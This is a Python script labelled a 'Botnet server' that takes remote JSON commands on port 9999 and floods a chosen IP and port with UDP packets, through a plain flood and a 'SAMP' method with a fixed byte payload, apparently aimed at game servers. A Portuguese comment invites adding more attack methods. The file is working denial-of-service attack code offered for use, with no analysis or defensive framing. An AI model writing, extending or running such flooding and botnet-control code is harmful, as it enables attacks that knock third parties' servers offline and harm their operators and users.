import socket
import threading
import json
import time

def handle_client(client_socket):
    request = client_socket.recv(1024).decode()
    command = json.loads(request)
    if command["action"] == "attack":
        method = command["method"]
        target_ip = command["target_ip"]
        target_port = command["target_port"]
        duration = command["duration"]
        attack(method, target_ip, target_port, duration)
        response = {"status": "attack started"}
    else:
        response = {"status": "unknown command"}
    client_socket.sendall(json.dumps(response).encode())
    client_socket.close()

def attack(method, target_ip, target_port, duration):
    end_time = time.time() + duration
    if method == "UDP":
        udp_attack(target_ip, target_port, end_time)
    elif method == "SAMP":
        samp_attack(target_ip, target_port, end_time)
    # Adicione mais métodos conforme necessário

def udp_attack(target_ip, target_port, end_time):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            s.sendto(b"A" * 1024, (target_ip, target_port))

def samp_attack(target_ip, target_port, end_time):
    payload = b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            s.sendto(payload, (target_ip, target_port))

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Botnet server listening on port 9999")
    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    main()
